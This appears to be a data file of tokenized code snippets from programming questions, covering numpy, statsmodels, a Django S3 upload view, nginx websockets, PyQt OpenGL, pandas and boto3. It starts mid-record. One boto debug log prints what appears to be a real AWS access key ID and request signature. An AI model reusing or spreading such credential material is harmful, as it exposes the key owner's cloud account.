-3self.foo is 3 , self.view ( np.ndarray ) is array ( [ 30 , 32 , 34 , 36 , 38 ] ) __array_finalize____array_finalize____array_finalize____getitem__key is -2self.foo is 4 , self.view ( np.ndarray ) is array ( [ 30 , 32 , 34 , 36 , 38 ] ) __array_finalize____array_finalize____array_finalize____getitem__key is -1self.foo is 5 , self.view ( np.ndarray ) is array ( [ 30 , 32 , 34 , 36 , 38 ] ) __array_finalize____array_finalize____array_finalize__new_array ( [ [ 30 , 32 , 34 , 36 , 38 ] ] ) p.foo is now 0s.foo is now 1q.foo is now 1"
"import statsmodels.api as smimport statsmodels.formula.api as smfdf.reset_index ( drop=True , inplace=True ) display ( df.describe ( ) ) md = smf.mixedlm ( `` c ~ iscorr '' , df , groups=df.subnum ) mdf = md.fit ( ) IndexError Traceback ( most recent call last ) < ipython-input-34-5373fe9b774a > in < module > ( ) 4 df.reset_index ( drop=True , inplace=True ) 5 display ( df.describe ( ) ) -- -- > 6 md = smf.mixedlm ( `` c ~ iscorr '' , df , groups=df.subnum ) 7 # mdf = md.fit ( ) /home/lthibault/.pyenv/versions/3.5.0/lib/python3.5/site-packages/statsmodels/regression/mixed_linear_model.py in from_formula ( cls , formula , data , re_formula , subset , *args , **kwargs ) 651 subset=None , 652 exog_re=exog_re , -- > 653 *args , **kwargs ) 654 655 # expand re names to account for pairs of RE/home/lthibault/.pyenv/versions/3.5.0/lib/python3.5/site-packages/statsmodels/base/model.py in from_formula ( cls , formula , data , subset , *args , **kwargs ) 148 kwargs.update ( { 'missing_idx ' : missing_idx , 149 'missing ' : missing } ) -- > 150 mod = cls ( endog , exog , *args , **kwargs ) 151 mod.formula = formula 152 /home/lthibault/.pyenv/versions/3.5.0/lib/python3.5/site-packages/statsmodels/regression/mixed_linear_model.py in __init__ ( self , endog , exog , groups , exog_re , use_sqrt , missing , **kwargs ) 537 538 # Split the data by groups -- > 539 self.endog_li = self.group_list ( self.endog ) 540 self.exog_li = self.group_list ( self.exog ) 541 self.exog_re_li = self.group_list ( self.exog_re ) /home/lthibault/.pyenv/versions/3.5.0/lib/python3.5/site-packages/statsmodels/regression/mixed_linear_model.py in group_list ( self , array ) 671 if array.ndim == 1 : 672 return [ np.array ( array [ self.row_indices [ k ] ] ) -- > 673 for k in self.group_labels ] 674 else : 675 return [ np.array ( array [ self.row_indices [ k ] , : ] ) /home/lthibault/.pyenv/versions/3.5.0/lib/python3.5/site-packages/statsmodels/regression/mixed_linear_model.py in < listcomp > ( .0 ) 671 if array.ndim == 1 : 672 return [ np.array ( array [ self.row_indices [ k ] ] ) -- > 673 for k in self.group_labels ] 674 else : 675 return [ np.array ( array [ self.row_indices [ k ] , : ] ) IndexError : index 7214 is out of bounds for axis 1 with size 7214"
"% reload_ext autoreload % autoreload 2 class LegacyBase : def important_method ( self ) : # old stuff i 'll needclass NewClass ( LegacyBase ) : # overload base method def important_method ( self ) : # do some new stuff while 1 : # call old method to do stuff super ( NewClass , self ) .important_method ( ) # use old Python2 super calls : ( # some break conditions TypeError : super ( type , obj ) : obj must be an instance or subtype of type"
paste make-config appname production.inipaste setup-app production.ini # appname paste upgrade-app production.ini # appname
"var obj = { } obj.__setitem__ = function ( key , value ) { this [ key ] = value * value } obj.x = 2 // 4obj.y = 3 // 9 class CustomDict ( dict ) : def __setitem__ ( self , key , value ) : super ( CustomDict , self ) .__setitem__ ( key , value * value ) d = CustomDict ( ) d [ ' x ' ] = 2 # 4d [ ' y ' ] = 3 # 9"
schema = tfdv.infer_schema ( stats )
"array ( [ [ [ 0 , 1 , 2 ] , [ 3 , 4 , 5 ] , [ 6 , 7 , 8 ] ] , [ [ 9 , 10 , 11 ] , [ 12 , 13 , 14 ] , [ 15 , 16 , 17 ] ] , [ [ 18 , 19 , 20 ] , [ 21 , 22 , 23 ] , [ 24 , 25 , 26 ] ] ] )"
"bucket_name : XXXXXXXXkey_name : b45069b8-dc44-45fe-8b67-b25fc088bdea.jpgaws_bucket : < Bucket : XXXXXXXXX > aws_key : < Key : XXXXXXXX , b45069b8-dc44-45fe-8b67-b25fc088bdea.jpg > 2014-04-17 15:01:56,576 boto [ DEBUG ] : path=/b45069b8-dc44-45fe-8b67-b25fc088bdea.jpg2014-04-17 15:01:56,577 boto [ DEBUG ] : auth_path=/thisorthis/b45069b8-dc44-45fe-8b67-b25fc088bdea.jpg2014-04-17 15:01:56,577 boto [ DEBUG ] : Method : DELETE2014-04-17 15:01:56,577 boto [ DEBUG ] : Path : /b45069b8-dc44-45fe-8b67-b25fc088bdea.jpg2014-04-17 15:01:56,577 boto [ DEBUG ] : Data:2014-04-17 15:01:56,577 boto [ DEBUG ] : Headers : { } 2014-04-17 15:01:56,577 boto [ DEBUG ] : Host : XXXXXXX.s3.amazonaws.com2014-04-17 15:01:56,578 boto [ DEBUG ] : Port : 4432014-04-17 15:01:56,578 boto [ DEBUG ] : Params : { } 2014-04-17 15:01:56,578 boto [ DEBUG ] : establishing HTTPS connection : host=thisorthis.s3.amazonaws.com , kwargs= { 'port ' : 443 , 'timeout ' : 70 } 2014-04-17 15:01:56,578 boto [ DEBUG ] : Token : None2014-04-17 15:01:56,578 boto [ DEBUG ] : StringToSign : DELETEThu , 17 Apr 2014 15:01:56 GMT/XXXXXXXX/b45069b8-dc44-45fe-8b67-b25fc088bdea.jpg2014-04-17 15:01:56,579 boto [ DEBUG ] : Signature : AWS AKIAJYS27FQSNHPH3CXQ : dVKlBpulsY9LrOtHOa+xQmurIEM= [ 17/Apr/2014 15:01:57 ] `` DELETE /s3/delete/b45069b8-dc44-45fe-8b67-b25fc088bdea ? key=b45069b8-dc44-45fe-8b67-b25fc088bdea.jpg & bucket=XXXXXXXX HTTP/1.1 '' 500 15975 AWS_CLIENT_SECRET_KEY = os.getenv ( `` AWS_CLIENT_SECRET_KEY '' ) AWS_SERVER_PUBLIC_KEY = os.getenv ( `` AWS_SERVER_PUBLIC_KEY '' ) AWS_SERVER_SECRET_KEY = os.getenv ( `` AWS_SERVER_SECRET_KEY '' ) AWS_EXPECTED_BUCKET = 'mybucketname'AWS_MAX_SIZE = 15000000 $ ( `` # fine-uploader ) .fineUploaderS3 ( { debug : true , request : { endpoint : 'XXXXX ' , accessKey : 'XXXXXXXX ' } , template : `` simple-previews-template '' , signature : { endpoint : '/s3/signature/ ' } , uploadSuccess : { endpoint : '/s3/success/ ' } , iframeSupport : { localBlankPagePath : '/success.html ' } , deleteFile : { enabled : true , endpoint : '/s3/delete/ ' } , classes : { dropActive : `` cssClassToAddToDropZoneOnEnter '' } , } ) url ( r'^s3/signature/ ' , views.handle_s3 , name= '' s3_signee '' ) , url ( r'^s3/delete/ ' , views.handle_s3 , name='s3_delete ' ) , url ( r'^s3/success/ ' , views.success_redirect_endpoint , name= '' s3_succes_endpoint '' ) try : import boto from boto.s3.connection import Key , S3Connection boto.set_stream_logger ( 'boto ' ) S3 = S3Connection ( development.AWS_SERVER_PUBLIC_KEY , development.AWS_SERVER_SECRET_KEY ) except ImportError , e : print ( `` Could not import boto , the Amazon SDK for Python . '' ) print ( `` Deleting files will not work . '' ) print ( `` Install boto with '' ) print ( `` $ pip install boto '' ) @ csrf_exemptdef success_redirect_endpoint ( request ) : `` '' '' This is where the upload will snd a POST request after the file has been stored in S3. `` '' '' key = request.POST.get ( 'key ' ) response = { } response [ 'url ' ] = key return HttpResponse ( json.dumps ( response ) , content_type= '' application/json '' ) @ csrf_exemptdef handle_s3 ( request ) : `` '' '' View which handles all POST and DELETE requests sent by Fine Uploader S3 . You will need to adjust these paths/conditions based on your setup. `` '' '' if request.method == `` POST '' : return handle_POST ( request ) elif request.method == `` DELETE '' : return handle_DELETE ( request ) else : return HttpResponse ( status=405 ) def handle_POST ( request ) : `` '' '' Handle S3 uploader POST requests here . For files < =5MiB this is a simple request to sign the policy document . For files > 5MiB this is a request to sign the headers to start a multipart encoded request. `` '' '' if request.POST.get ( 'success ' , None ) : return make_response ( 200 ) else : request_payload = json.loads ( request.body ) headers = request_payload.get ( 'headers ' , None ) if headers : print `` headers '' # The presence of the 'headers ' property in the request payload # means this is a request to sign a REST/multipart request # and NOT a policy document response_data = sign_headers ( headers ) else : print `` no headers '' if not is_valid_policy ( request_payload ) : print `` is not valid '' return make_response ( 400 , { 'invalid ' : True } ) response_data = sign_policy_document ( request_payload ) response_payload = json.dumps ( response_data ) return make_response ( 200 , response_payload ) def handle_DELETE ( request ) : `` '' '' Handle file deletion requests . For this , we use the Amazon Python SDK , boto. `` '' '' print `` handle delete '' if boto : bucket_name = request.REQUEST.get ( 'bucket ' ) print `` bucket_name : `` , bucket_name key_name = request.REQUEST.get ( 'key ' ) print `` key_name : '' , key_name aws_bucket = S3.get_bucket ( bucket_name , validate=False ) print `` aws_bucket : `` , aws_bucket aws_key = Key ( aws_bucket , key_name ) print `` aws_key : `` , aws_key aws_key.delete ( ) print `` after aws_key.delete ( ) '' return make_response ( 200 ) else : return make_response ( 500 ) def make_response ( status=200 , content=None ) : `` '' '' Construct an HTTP response . Fine Uploader expects 'application/json'. `` '' '' response = HttpResponse ( ) response.status_code = status response [ 'Content-Type ' ] = `` application/json '' response.content = content return responsedef is_valid_policy ( policy_document ) : `` '' '' Verify the policy document has not been tampered with client-side before sending it off. `` '' '' bucket = development.AWS_EXPECTED_BUCKET parsed_max_size = development.AWS_MAX_SIZE print `` check validity '' # bucket = `` # parsed_max_size = 0 for condition in policy_document [ 'conditions ' ] : if isinstance ( condition , list ) and condition [ 0 ] == 'content-length-range ' : parsed_max_size = condition [ 2 ] else : if condition.get ( 'bucket ' , None ) : bucket = condition [ 'bucket ' ] return bucket == development.AWS_EXPECTED_BUCKET and parsed_max_size == development.AWS_MAX_SIZEdef sign_policy_document ( policy_document ) : `` '' '' Sign and return the policy doucument for a simple upload . http : //aws.amazon.com/articles/1434/ # signyours3postform `` '' '' policy = base64.b64encode ( json.dumps ( policy_document ) ) signature = base64.b64encode ( hmac.new ( development.AWS_CLIENT_SECRET_KEY , policy , hashlib.sha1 ) .digest ( ) ) return { 'policy ' : policy , 'signature ' : signature } def sign_headers ( headers ) : `` '' '' Sign and return the headers for a chunked upload. `` '' '' print `` sign headers '' return { 'signature ' : base64.b64encode ( hmac.new ( development.AWS_CLIENT_SECRET_KEY , headers , hashlib.sha1 ) .digest ( ) ) }"
"Var1 = c ( `` navy '' , `` darkgreen '' ) names ( Var1 ) = c ( `` Class1 '' , `` Class2 '' ) ann_colors = list ( Var1 = Var1 ) > ann_colors $ Var1 Class1 Class2 `` navy '' `` darkgreen '' robjects.ListVector ( { `` Class1 '' : `` navy '' , `` Class2 '' : `` green '' } )"
"import networkx as nximport numpy as npfrom networkx.utils import powerlaw_sequencez=nx.utils.create_degree_sequence ( 200 , nx.utils.powerlaw_sequence , exponent=1.9 ) nx.is_valid_degree_sequence ( z ) G=nx.configuration_model ( z ) Gcc=nx.connected_component_subgraphs ( G ) [ 0 ] edgelist= [ nx.utils.powerlaw_sequence ( nx.number_of_edges ( Gcc ) , exponent=2.0 ) ] nx.from_edgelist ( edgelist , create_using=None )"
"import pandas as pdimport pandas_datareader.data as webimport plotly.offline as pyoimport plotly.graph_objs as gostock_ticker='AAPL'start_date='2019-04-01'end_date='2019-05-22'data= [ ] hist_stock_df = web.DataReader ( stock_ticker , 'iex ' , start_date , end_date ) data.append ( go.Candlestick ( x=hist_stock_df.index , open=hist_stock_df [ 'open ' ] , high=hist_stock_df [ 'high ' ] , low=hist_stock_df [ 'low ' ] , close=hist_stock_df [ 'close ' ] , name='AAPL ' ) ) data.append ( go.Bar ( x=hist_stock_df.index , y=hist_stock_df [ 'volume ' ] .values , yaxis='y2 ' ) ) # y0=1000000layout=go.Layout ( title= 'Candestick Chart of AAPL ' , xaxis=dict ( title='Date ' , rangeslider=dict ( visible=False ) ) , yaxis=dict ( title='Price ' ) , plot_bgcolor= ' # 9b9b9b ' , paper_bgcolor= ' # 9b9b9b ' , font=dict ( color= ' # c4c4c4 ' ) , yaxis2=dict ( title='Volume ' , overlaying= ' y ' , side='right ' ) ) # scaleanchor= ' y ' ) ) # scaleratio=0.00000001 , # rangemode='tozero ' , # constraintoward='bottom ' , # domain= [ 0,0.1 ] ) ) fig = go.Figure ( data=data , layout=layout ) pyo.iplot ( fig ) layout=go.Layout ( title= 'Candestick Chart of AAPL ' , xaxis=dict ( title='Date ' , rangeslider=dict ( visible=False ) ) , yaxis=dict ( title='Price ' ) , plot_bgcolor= ' # 9b9b9b ' , paper_bgcolor= ' # 9b9b9b ' , font=dict ( color= ' # c4c4c4 ' ) , yaxis2=dict ( title='Volume ' , overlaying= ' y ' , side='right ' , scaleanchor= ' y ' , scaleratio=0.0000001 ) )"
self.fields [ 'field_name ' ] .foo = 'bar ' { { form.field_name.foo } }
"Django==2.0.3channels==2.0.2channels-redis==2.1.1daphne==2.1.0asgiref==2.3.0Twisted==17.9.0aioredis==1.0.0autobahn==18.4.1 Ubuntu - 16.04Nginx - 1.12.0 map $ http_upgrade $ connection_upgrade { default upgrade ; `` close ; } # the upstream component nginx needs to connect to websocket requestsupstream websocket { server unix : /path/to/my/app/daphne.sock ; } # configuration of the serverserver { # the port your site will be served on listen 80 ; # the domain name it will serve for server_name ip_address ; charset utf-8 ; # Sending all non-media requests for websockets to the Daphne server . location /ws/ { proxy_pass http : //websocket ; proxy_http_version 1.1 ; proxy_set_header Upgrade $ http_upgrade ; proxy_set_header Connection $ connection_upgrade ; } } from django.conf.urls import urlfrom channels.auth import AuthMiddlewareStackfrom channels.routing import ProtocolTypeRouter , URLRouterfrom myapp import consumersapplication = ProtocolTypeRouter ( { 'websocket ' : AuthMiddlewareStack ( URLRouter ( [ url ( r'^ws/ $ ' , consumers.MyConsumer ) , ] ) ) , } ) None - - [ TimeStamp ] `` GET /ws/ '' 404 3None - - [ TimeStamp ] `` GET /ws/ '' 404 3None - - [ TimeStamp ] `` GET /ws/ '' 404 3"
"> > > values = [ 0 , 1 , 2 ] > > > values [ 1 ] = values > > > values [ 0 , [ ... ] , 2 ] [ 0 , [ 0 , 1 , 2 ] , 2 ]"
"NUM , NAME , ORG , DATA 1 , AAA,10,123.4 1 , AAB,20,176.5 1 , AAC,30,133.5 NUM , NAME , ORG , DATA 1 , AAA,10,111.4 1 , AAC,30,122.5 2 , BBA,12,156.7 NUM , NAME , ORG , File1 , File2 ... . 1 , AAA , 10 , 123.4 , 111.4 1 , AAB , 20 , 176.5 , NaN 1 , AAC , 30 , 133.5 , 122.5 2 , BBA , 12 , NaN , 156.7 ... .. import pandas as pdimport globwriter = pd.ExcelWriter ( 'analysis.xlsx ' , engine='xlsxwriter ' ) data = [ ] df1 = pd.read_csv ( `` file1.cs '' , sep = ' , ' , header = 'infer ' ) for infile in glob.glob ( `` *.cs '' ) : df = pd.read_csv ( infile , sep = ' , ' , header = 'infer ' ) name = infile [ 13 : -7 ] df [ 'filename ' ] = name data.append ( df ) result = pd.merge ( df1 , data.to_frame ( ) , on= 'NAME ' ) result.to_excel ( writer , sheet_name=sheetname ) writer.save ( )"
from __future__ import nested_scopesfrom __future__ import generatorsfrom __future__ import divisionfrom __future__ import absolute_importfrom __future__ import with_statementfrom __future__ import print_functionfrom __future__ import unicode_literals
"class GLWidget ( QtOpenGL.QGLWidget ) : def __init__ ( self , parent=None ) : self.parent = parent QtOpenGL.QGLWidget.__init__ ( self , parent ) self.current_position = 0 def initializeGL ( self ) : self.initGeometry ( ) self.vertex_code = `` '' '' # version 120 attribute vec4 color ; attribute float x_position ; attribute float y_position ; varying vec4 v_color ; void main ( ) { gl_Position = vec4 ( x_position , y_position , 0.0 , 1.0 ) ; v_color = color ; } `` '' '' self.fragment_code = `` '' '' # version 120 varying vec4 v_color ; void main ( ) { //gl_FragColor = v_color ; gl_FragColor = vec4 ( 1,1,1,1 ) ; } `` '' '' # # Build and activate program # Request program and shader slots from GPU self.program = GL.glCreateProgram ( ) self.vertex = GL.glCreateShader ( GL.GL_VERTEX_SHADER ) self.fragment = GL.glCreateShader ( GL.GL_FRAGMENT_SHADER ) # Set shaders source GL.glShaderSource ( self.vertex , self.vertex_code ) GL.glShaderSource ( self.fragment , self.fragment_code ) # Compile shaders GL.glCompileShader ( self.vertex ) GL.glCompileShader ( self.fragment ) # Attach shader objects to the program GL.glAttachShader ( self.program , self.vertex ) GL.glAttachShader ( self.program , self.fragment ) # Build program GL.glLinkProgram ( self.program ) # Get rid of shaders ( not needed anymore ) GL.glDetachShader ( self.program , self.vertex ) GL.glDetachShader ( self.program , self.fragment ) # Make program the default program GL.glUseProgram ( self.program ) # Create array object self.vao = GL.glGenVertexArrays ( 1 ) GL.glBindVertexArray ( self.vao ) # Request buffer slot from GPU self.x_data_buffer = GL.glGenBuffers ( 1 ) GL.glBindBuffer ( GL.GL_ARRAY_BUFFER , self.x_data_buffer ) GL.glBufferData ( GL.GL_ARRAY_BUFFER , ArrayDatatype.arrayByteCount ( self.x ) , self.x , GL.GL_DYNAMIC_DRAW ) self.y_data_buffer = GL.glGenBuffers ( 1 ) GL.glBindBuffer ( GL.GL_ARRAY_BUFFER , self.y_data_buffer ) GL.glBufferData ( GL.GL_ARRAY_BUFFER , ArrayDatatype.arrayByteCount ( self.y ) , self.y , GL.GL_DYNAMIC_DRAW ) # # Bind attributes # self.stride = self.x.strides [ 0 ] # self.offset = ctypes.c_void_p ( 0 ) self.loc = GL.glGetAttribLocation ( self.program , `` x_position '' .encode ( 'utf-8 ' ) ) GL.glEnableVertexAttribArray ( self.loc ) GL.glBindBuffer ( GL.GL_ARRAY_BUFFER , self.x_data_buffer ) GL.glVertexAttribPointer ( self.loc , 1 , GL.GL_FLOAT , GL.GL_FALSE , 0 , 0 ) # self.stride = self.y.strides [ 0 ] # self.offset = ctypes.c_void_p ( 0 ) self.loc = GL.glGetAttribLocation ( self.program , `` y_position '' .encode ( 'utf-8 ' ) ) GL.glEnableVertexAttribArray ( self.loc ) GL.glBindBuffer ( GL.GL_ARRAY_BUFFER , self.y_data_buffer ) GL.glVertexAttribPointer ( self.loc , 1 , GL.GL_FLOAT , GL.GL_FALSE , 0 , 0 ) def resizeGL ( self , width , height ) : if height == 0 : height = 1 GL.glViewport ( 0 , 0 , width , height ) GL.glMatrixMode ( GL.GL_PROJECTION ) GL.glLoadIdentity ( ) aspect = width / float ( height ) GLU.gluPerspective ( 45.0 , aspect , 1.0 , 100.0 ) GL.glMatrixMode ( GL.GL_MODELVIEW ) def paintGL ( self ) : GL.glClear ( GL.GL_COLOR_BUFFER_BIT | GL.GL_DEPTH_BUFFER_BIT ) GL.glDrawArrays ( GL.GL_LINE_STRIP , 0 , self.bins ) def initGeometry ( self ) : self.bins = 1000 self.x = np.linspace ( -0.5,0.5 , self.bins ) self.y = np.array ( [ np.sin ( val*2*np.pi ) for val in self.x ] ) self.color = np.array ( [ ( 1,1,1,1 ) for x in np.arange ( self.bins ) ] ) def addPoint ( self , point ) : # print ( 'ADD POINT ' ) self.y [ self.current_position ] = point if self.current_position < self.bins-1 : self.current_position += 1 else : self.current_position = 0 return True def render ( self ) : # print ( 'RENDER ' ) self.updateGL ( ) return True import sysfrom PyQt5.QtWidgets import QDesktopWidget , QMainWindow , QWidget , QAction , qApp , QApplication , QHBoxLayout , QVBoxLayout , QPushButtonfrom PyQt5.QtCore import QTimerfrom PyQt5.QtGui import QIconfrom PyQt5 import QtOpenGLfrom OpenGL import GLfrom OpenGL import GLUfrom OpenGL.arrays.arraydatatype import ArrayDatatypeimport ctypesimport numpy as npfrom threading import Timer , Thread , Eventclass OxySensor ( QMainWindow ) : def __init__ ( self ) : super ( ) .__init__ ( ) self.initUI ( ) self.initActions ( ) self.initMenuBar ( ) self.initRenderTimer ( ) self.start ( ) def initUI ( self ) : self.resize ( 800,600 ) self.center ( ) self.setWindowTitle ( 'OxySensor ' ) okButton = QPushButton ( `` OK '' ) cancelButton = QPushButton ( `` Cancel '' ) hbox = QHBoxLayout ( ) hbox.addStretch ( 1 ) hbox.addWidget ( okButton ) hbox.addWidget ( cancelButton ) vbox = QVBoxLayout ( ) # vbox.addStretch ( 1 ) self.gl_widget = GLWidget ( ) vbox.addWidget ( self.gl_widget ) vbox.addLayout ( hbox ) mainWidget = QWidget ( self ) mainWidget.setLayout ( vbox ) self.setCentralWidget ( mainWidget ) self.show ( ) def initActions ( self ) : self.exitAction = QAction ( QIcon ( 'images/close20.png ' ) , ' & Exit ' , self ) self.exitAction.setShortcut ( 'Ctrl+W ' ) self.exitAction.setStatusTip ( 'Exit application ' ) self.exitAction.triggered.connect ( self.onExit ) def initMenuBar ( self ) : menubar = self.menuBar ( ) fileMenu = menubar.addMenu ( ' & File ' ) fileMenu.addAction ( self.exitAction ) return True def initRenderTimer ( self ) : self.timer = QTimer ( ) self.timer.timeout.connect ( self.gl_widget.render ) self.timer.start ( 100 ) return True def start ( self ) : self.stop_flag = Event ( ) self.thread = SerialPort ( self.onTimerExpired , self.stop_flag ) self.thread.start ( ) self.statusBar ( ) .showMessage ( 'Ready ' ) def center ( self ) : qr = self.frameGeometry ( ) cp = QDesktopWidget ( ) .availableGeometry ( ) .center ( ) qr.moveCenter ( cp ) self.move ( qr.topLeft ( ) ) return True def onTimerExpired ( self ) : data = np.random.uniform ( -1,1 ) self.gl_widget.addPoint ( data ) return True def onExit ( self ) : self.close ( ) return None def closeEvent ( self , event ) : self.stop_flag.set ( ) event.accept ( ) return Noneclass GLWidget ( QtOpenGL.QGLWidget ) : def __init__ ( self , parent=None ) : self.parent = parent QtOpenGL.QGLWidget.__init__ ( self , parent ) self.yRotDeg = 0.0 self.current_position = 0 def initializeGL ( self ) : self.initGeometry ( ) self.vertex_code = `` '' '' # version 120 attribute vec4 color ; attribute float x_position ; attribute float y_position ; varying vec4 v_color ; void main ( ) { gl_Position = vec4 ( x_position , y_position , 0.0 , 1.0 ) ; v_color = color ; } `` '' '' self.fragment_code = `` '' '' # version 120 varying vec4 v_color ; void main ( ) { //gl_FragColor = v_color ; gl_FragColor = vec4 ( 1,1,1,1 ) ; } `` '' '' # # Build and activate program # Request program and shader slots from GPU self.program = GL.glCreateProgram ( ) self.vertex = GL.glCreateShader ( GL.GL_VERTEX_SHADER ) self.fragment = GL.glCreateShader ( GL.GL_FRAGMENT_SHADER ) # Set shaders source GL.glShaderSource ( self.vertex , self.vertex_code ) GL.glShaderSource ( self.fragment , self.fragment_code ) # Compile shaders GL.glCompileShader ( self.vertex ) GL.glCompileShader ( self.fragment ) # Attach shader objects to the program GL.glAttachShader ( self.program , self.vertex ) GL.glAttachShader ( self.program , self.fragment ) # Build program GL.glLinkProgram ( self.program ) # Get rid of shaders ( not needed anymore ) GL.glDetachShader ( self.program , self.vertex ) GL.glDetachShader ( self.program , self.fragment ) # Make program the default program GL.glUseProgram ( self.program ) # Create array object self.vao = GL.glGenVertexArrays ( 1 ) GL.glBindVertexArray ( self.vao ) # Request buffer slot from GPU self.x_data_buffer = GL.glGenBuffers ( 1 ) GL.glBindBuffer ( GL.GL_ARRAY_BUFFER , self.x_data_buffer ) GL.glBufferData ( GL.GL_ARRAY_BUFFER , ArrayDatatype.arrayByteCount ( self.x ) , self.x , GL.GL_DYNAMIC_DRAW ) self.y_data_buffer = GL.glGenBuffers ( 1 ) GL.glBindBuffer ( GL.GL_ARRAY_BUFFER , self.y_data_buffer ) GL.glBufferData ( GL.GL_ARRAY_BUFFER , ArrayDatatype.arrayByteCount ( self.y ) , self.y , GL.GL_DYNAMIC_DRAW ) # # Bind attributes # self.stride = self.x.strides [ 0 ] # self.offset = ctypes.c_void_p ( 0 ) self.loc = GL.glGetAttribLocation ( self.program , `` x_position '' .encode ( 'utf-8 ' ) ) GL.glEnableVertexAttribArray ( self.loc ) GL.glBindBuffer ( GL.GL_ARRAY_BUFFER , self.x_data_buffer ) GL.glVertexAttribPointer ( self.loc , 1 , GL.GL_FLOAT , GL.GL_FALSE , 0 , 0 ) # self.stride = self.y.strides [ 0 ] # self.offset = ctypes.c_void_p ( 0 ) self.loc = GL.glGetAttribLocation ( self.program , `` y_position '' .encode ( 'utf-8 ' ) ) GL.glEnableVertexAttribArray ( self.loc ) GL.glBindBuffer ( GL.GL_ARRAY_BUFFER , self.y_data_buffer ) GL.glVertexAttribPointer ( self.loc , 1 , GL.GL_FLOAT , GL.GL_FALSE , 0 , 0 ) def resizeGL ( self , width , height ) : if height == 0 : height = 1 GL.glViewport ( 0 , 0 , width , height ) GL.glMatrixMode ( GL.GL_PROJECTION ) GL.glLoadIdentity ( ) aspect = width / float ( height ) GLU.gluPerspective ( 45.0 , aspect , 1.0 , 100.0 ) GL.glMatrixMode ( GL.GL_MODELVIEW ) def paintGL ( self ) : GL.glClear ( GL.GL_COLOR_BUFFER_BIT | GL.GL_DEPTH_BUFFER_BIT ) GL.glDrawArrays ( GL.GL_LINE_STRIP , 0 , self.bins ) def initGeometry ( self ) : self.bins = 1000 self.x = np.linspace ( -0.5,0.5 , self.bins ) self.y = np.array ( [ np.sin ( val*2*np.pi ) for val in self.x ] ) self.color = np.array ( [ ( 1,1,1,1 ) for x in np.arange ( self.bins ) ] ) def addPoint ( self , point ) : # print ( 'ADD POINT ' ) self.y [ self.current_position ] = point if self.current_position < self.bins-1 : self.current_position += 1 else : self.current_position = 0 return True def render ( self ) : # print ( 'RENDER ' ) self.updateGL ( ) return Trueclass SerialPort ( Thread ) : def __init__ ( self , callback , event ) : Thread.__init__ ( self ) self.callback = callback self.stopped = event return None def SetInterval ( self , time_in_seconds ) : self.delay_period = time_in_seconds return True def run ( self ) : while not self.stopped.wait ( 0.1 ) : self.callback ( ) return Trueif __name__ == '__main__ ' : app = QApplication ( sys.argv ) oxy_sensor = OxySensor ( ) sys.exit ( app.exec_ ( ) )"
"> > > df = pd.DataFrame ( { 'a1 ' : [ 1,2 ] , 'a2 ' : [ 3,4 ] , 'b1 ' : [ 5,6 ] , 'b2 ' : [ 7,8 ] , ' c ' : [ 9,0 ] } ) > > > df a1 a2 b1 b2 c0 1 3 5 7 91 2 4 6 8 0 > > > > > > df2 = pd.DataFrame ( ) > > > for i in df.columns.str [ :1 ] .unique ( ) : try : df2 [ i ] = df [ [ x for x in df.columns if x [ :1 ] == i ] ] .values.flatten ( ) except : l = df [ [ x for x in df.columns if x [ :1 ] == i ] ] .values.flatten ( ) .tolist ( ) df2 [ i ] = l + [ pd.np.nan ] * ( len ( df2 ) - len ( l ) ) > > > df2 a b c0 1 5 9.01 3 7 0.02 2 6 NaN3 4 8 NaN > > >"
0 0 0 0 0 0 0 10 1 0 0 0 0 1 01 0 1 0 0 0 0 10 1 0 0 1 1 1 00 0 0 0 1 0 1 01 1 1 0 1 1 1 00 0 1 0 0 0 0 00 0 1 0 0 0 0 0
"rdd = sc.parallelize ( [ ( 0,1 ) , ( 0,5 ) , ( 0,3 ) , ( 1,2 ) , ( 1,3 ) , ( 2,6 ) ] ) df_data = sqlContext.createDataFrame ( rdd , [ `` group '' , '' value '' ] ) df_data.show ( ) + -- -- -+ -- -- -+|group|value|+ -- -- -+ -- -- -+| 0| 1|| 0| 5|| 0| 3|| 1| 2|| 1| 3|| 2| 6|+ -- -- -+ -- -- -+ + -- -- -+ -- -- -- -+ -- -- -- -+ -- -- -- -+ -- -- -- -+ -- -- -- -+|group|value_1|value_2|value_3|value_5|value_6|+ -- -- -+ -- -- -- -+ -- -- -- -+ -- -- -- -+ -- -- -- -+ -- -- -- -+| 0| true| false| true| true| false|| 1| false| true| true| false| false|| 2| false| false| false| false| true|+ -- -- -+ -- -- -- -+ -- -- -- -+ -- -- -- -+ -- -- -- -+ -- -- -- -+"
"import numpy as nparray_of_zeros = np.zeros ( ( 1000 , ) , ) import pandas as pddict1 = { 'start ' : [ 100 , 200 , 300 ] , 'end ' : [ 400 , 500 , 600 ] } df = pd.DataFrame ( dict1 ) print ( df ) # # # # start end # # 0 100 400 # # 1 200 500 # # 2 300 600 import numpy as nparray_of_zeros = np.zeros ( ( 1000 , ) , ) import pandas as pddict1 = { 'start ' : [ 100 , 200 , 300 ] , 'end ' : [ 400 , 500 , 600 ] } df = pd.DataFrame ( dict1 ) print ( df ) for idx , row in df.iterrows ( ) : for i in range ( int ( row.start ) , int ( row.end ) +1 ) : array_of_zeros [ i ] +=1 print ( array_of_zeros [ 15 ] ) # # output : 0.0print ( array_of_zeros [ 600 ] ) # # output : 1.0print ( array_of_zeros [ 400 ] ) # # output : 3.0print ( array_of_zeros [ 100 ] ) # # output : 1.0print ( array_of_zeros [ 200 ] ) # # output : 2.0 for i in range ( int ( row.start ) , int ( row.end ) +1 ) : array_of_zeros [ i ] +=1"
"def f ( x ) : return x PyObject * f ( PyObject * x ) { Py_XINCREF ( x ) ; return x ; } extern crate pyo3 ; use pyo3 : :prelude : :* ; # [ pyfunction ] pub fn f ( _py : Python , x : & PyObject ) - > PyResult < & PyObject > { Ok ( x ) } error [ E0106 ] : missing lifetime specifier -- > src/lib.rs:4:49 |4 | pub fn f ( _py : Python , x : & PyObject ) - > PyResult < & PyObject > { | ^ expected lifetime parameter | = help : this function 's return type contains a borrowed value , but the signature does not say whether it is borrowed from ` _py ` or ` x `"
"> > > import boto3 > > > session = boto3.session.Session ( > > > aws_access_key_id=AWS_ACCESS_KEY , > > > aws_secret_access_key=AWS_SECRET_KEY , > > > region_name='us-west-2 ' > > > ) > > > sqs = session.resource ( 'sqs ' ) > > > queue=sqs.Queue ( AWS_QUEUE_URL ) > > > > > > type ( queue ) < class 'boto3.resources.factory.sqs.Queue ' > def get_session ( ) - > boto3.resources.factory.sqs.Queue : ... AttributeError : module 'boto3.resources.factory ' has no attribute 'sqs '"
